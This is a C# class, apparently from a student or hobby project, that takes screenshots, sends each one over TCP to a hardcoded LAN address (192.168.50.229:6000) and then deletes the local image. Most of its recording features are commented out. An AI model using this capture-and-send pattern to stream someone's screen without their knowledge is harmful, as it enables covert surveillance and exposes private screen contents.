using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Drawing;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.IO.Compression;
using System.Net.Sockets;

namespace ScreenRecorder.Models
{
    public class ScrRecorder
    {
        //Video variables:
        private Rectangle bounds;
        private string outputPath = "";
        private string tempPath = "";
        private int fileCount = 1;
        private List<string> inputImageSequence = new List<string>();

        //File variables:
        //private string audioName = "mic.wav";
        //private string videoName = "video.mp4";
        //private string finalName = "FinalVideo.mp4";

        //Time variable:
        //Stopwatch watch = new Stopwatch();

        //Audio variables:
        //public static class NativeMethods
        //{
        //    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi, SetLastError = true)]
        //    public static extern int record(string lpstrCommand, string lpstrReturnString, int uReturnLength, int hwndCallback);
        //}

        //ScreenRecorder Object:
        public ScrRecorder(Rectangle b, string outPath)
        {
            //Create temporary folder for screenshots:
            CreateTempFolder("tempScreenCaps");

            //Set variables:
            bounds = b;
            outputPath = outPath;
        }

        //Create temporary folder:
        private void CreateTempFolder(string name)
        {
            //Check if a C or D drive exists:
            if (!Directory.Exists("C:\\tempScreenCaps"))
            {
                string pathName = "C:\\" + name;
                Directory.CreateDirectory(pathName);
                tempPath = pathName;
            }
            else
            {
                string pathName = "C:\\" + name;
                tempPath = pathName;
            }

        }

        //Change final video name:
        //public void setVideoName(string name)
        //{
        //    finalName = name;
        //}

        //Delete all files and directory:
        private void DeletePath(string targetDir)
        {
            string[] files = Directory.GetFiles(targetDir);
            //string[] dirs = Directory.GetDirectories(targetDir);


            // string sourceFolder = outputPath + "tempScreenCaps/" ; // исходная папка

            //Delete each file:
            foreach (string file in files)
            {
                File.SetAttributes(file, FileAttributes.Normal);
                File.Delete(file);
            }

            //Delete the path:
            //foreach (string dir in dirs)
            //{
            //    DeletePath(dir);
            //}

            //Directory.Delete(targetDir, false);
        }

        //Delete all files except the one specified:
        //private void DeleteFilesExcept(string targetDir, string excDir)
        //{
        //    string[] files = Directory.GetFiles(targetDir);

        //    //Delete each file except specified:
        //    foreach (string file in files)
        //    {
        //        if (file != excDir && file != "C:\\hiberfil.sys" && file != "C:\\pagefile.sys" && file != "C:\\swapfile.sys")
        //        {
        //            File.SetAttributes(file, FileAttributes.Normal);
        //            File.Delete(file);
        //        }
        //    }
        //}

        //Clean up program on crash:
        public void cleanUp()
        {
            if (Directory.Exists(tempPath))
            {
                DeletePath(tempPath);
            }
        }

        //Return elapsed time:
        //public string getElapsed()
        //{
        //    return string.Format("{0:D2}:{1:D2}:{2:D2}", watch.Elapsed.Hours, watch.Elapsed.Minutes, watch.Elapsed.Seconds);
        //}

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        //Record video:
        public void RecordVideo()
        {
            //Keep track of time:
            //watch.Start();

            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    //Add screen to bitmap:
                    g.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
                }
                //Save screenshot:
                //string name = tempPath + "//" + DateTime.Now.ToShortDateString() + DateTime.Now.ToLongTimeString() + ".png";
                string name = tempPath + "//screenshot-" + fileCount + ".jpeg";

                ImageCodecInfo jpgEncoder = GetEncoder(ImageFormat.Jpeg);

                // Create an Encoder object based on the GUID  
                // for the Quality parameter category.  
                System.Drawing.Imaging.Encoder myEncoder = System.Drawing.Imaging.Encoder.Quality;
 
                EncoderParameters myEncoderParameters = new EncoderParameters(1);

                EncoderParameter myEncoderParameter = new EncoderParameter(myEncoder, 50L);
                myEncoderParameters.Param[0] = myEncoderParameter;
                bitmap.Save(name, jpgEncoder, myEncoderParameters);

                inputImageSequence.Add(name);
                fileCount++;

                //Dispose of bitmap:
                bitmap.Dispose();

                //отправка изображения
                TcpClient client = new TcpClient("192.168.50.229", 6000);
                using (FileStream inputStream = File.OpenRead(name))
                {
                    using (NetworkStream outputStream = client.GetStream())
                    {
                        using (BinaryWriter writer = new BinaryWriter(outputStream))
                        {
                            long lenght = inputStream.Length;
                            long totalBytes = 0;
                            int readBytes = 0;
                            byte[] buffer = new byte[2048];
                            writer.Write(Path.GetFileName(name));
                            writer.Write(lenght);
                            do
                            {
                                readBytes = inputStream.Read(buffer, 0, buffer.Length);
                                outputStream.Write(buffer, 0, readBytes);
                                totalBytes += readBytes;
                            } while (client.Connected && totalBytes < lenght);
                        }
                    }
                }
                client.Close();
                File.Delete(name);
            }
        }

        //Record audio:
        //public void RecordAudio()
        //{
        //    NativeMethods.record("open new Type waveaudio Alias recsound", "", 0, 0);
        //    NativeMethods.record("record recsound", "", 0, 0);
        //}

        //Save audio file:
        //private void SaveAudio()
        //{
        //    string audioPath = "save recsound " + outputPath + "Video\\" + audioName;
        //    NativeMethods.record(audioPath, "", 0, 0);
        //    NativeMethods.record("close recsound", "", 0, 0);
        //}

        //Save video file:
        //private void SaveVideo(int width, int height, int frameRate)
        //{
        //    using (VideoFileWriter vFWriter = new VideoFileWriter())
        //    {
        //        //Create new video file:
        //        vFWriter.Open(outputPath + "//" + videoName, width, height, frameRate, VideoCodec.MPEG4);

        //        //Make each screenshot into a video frame:
        //        foreach (string imageLocation in inputImageSequence)
        //        {
        //            Bitmap imageFrame = System.Drawing.Image.FromFile(imageLocation) as Bitmap;
        //            vFWriter.WriteVideoFrame(imageFrame);
        //            imageFrame.Dispose();
        //        }

        //        //Close:
        //        vFWriter.Close();
        //    }



        //}

        //Combine video and audio files:
        //private void CombineVideoAndAudio(string video, string audio)
        //{

        //    //FFMPEG command to combine video and audio:
        //    string args = $"/c \"ffmpeg -i {video} -i {audio} -shortest {finalName}\"";
        //    ProcessStartInfo startInfo = new ProcessStartInfo
        //    {
        //        CreateNoWindow = false,
        //        FileName = "cmd.exe",
        //        WorkingDirectory = outputPath,
        //        UseShellExecute = false,
        //        Arguments = args
        //    };

        //    //Execute command:
        //    using (Process exeProcess = Process.Start(startInfo))
        //    {
        //        exeProcess.WaitForExit();
        //    }

        //}

        public void Stop()
        {
            //Stop watch:
            //watch.Stop();

            //Video variables:
            //int width = bounds.Width;
            //int height = bounds.Height;
            //int frameRate = 10;

            //Save audio:
            //SaveAudio();

            //Save video:
            //SaveVideo(width, height, frameRate);

            //Combine audio and video files:
            //CombineVideoAndAudio(videoName, audioName);

            //Delete the screenshots and temporary folder:
            DeletePath(tempPath);

            //Delete separated video and audio files:
            //DeleteFilesExcept(outputPath, outputPath + "" + finalName);
        }
    }
}
